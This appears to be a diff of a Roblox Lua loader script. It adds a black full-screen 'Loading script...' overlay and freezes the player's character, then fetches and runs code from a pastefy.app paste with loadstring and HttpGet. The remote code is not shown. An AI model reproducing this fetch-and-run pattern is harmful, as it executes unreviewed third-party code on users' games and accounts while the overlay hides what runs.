@@ -1,1 +1,66 @@
-loadstring(game:HttpGet("https://pastefy.app/oUQ3Lvec/raw"))()
+-- SERVICES
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local HttpService = game:GetService("HttpService")
+local LocalPlayer = Players.LocalPlayer
+
+-- FREEZE MOVEMENT
+local function freezePlayer()
+	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+	local humanoid = character:WaitForChild("Humanoid")
+	humanoid.WalkSpeed = 0
+	humanoid.JumpPower = 0
+end
+
+-- UNFREEZE
+local function unfreezePlayer()
+	local character = LocalPlayer.Character
+	if character and character:FindFirstChild("Humanoid") then
+		character.Humanoid.WalkSpeed = 16
+		character.Humanoid.JumpPower = 50
+	end
+end
+
+-- LOADING UI
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "CustomLoadingScreen"
+screenGui.IgnoreGuiInset = true
+screenGui.ResetOnSpawn = false
+screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(1, 0, 1, 0)
+frame.Position = UDim2.new(0, 0, 0, 0)
+frame.BackgroundColor3 = Color3.new(0, 0, 0)
+frame.BackgroundTransparency = 0
+frame.BorderSizePixel = 0
+frame.Parent = screenGui
+
+local label = Instance.new("TextLabel")
+label.Size = UDim2.new(1, 0, 0, 60)
+label.Position = UDim2.new(0, 0, 0.5, -30)
+label.BackgroundTransparency = 1
+label.TextColor3 = Color3.new(1, 1, 1)
+label.Font = Enum.Font.GothamBold
+label.Text = "🔄 Loading script..."
+label.TextScaled = true
+label.Parent = frame
+
+-- START
+freezePlayer()
+
+task.spawn(function()
+	-- Run your external script
+	local success, err = pcall(function()
+		loadstring(game:HttpGet("https://pastefy.app/oUQ3Lvec/raw"))()
+	end)
+
+	-- Cleanup
+	if not success then
+		label.Text = "❌ Error loading script"
+		warn("Script load error:", err)
+	else
+		unfreezePlayer()
+		screenGui:Destroy()
+	end
+end)
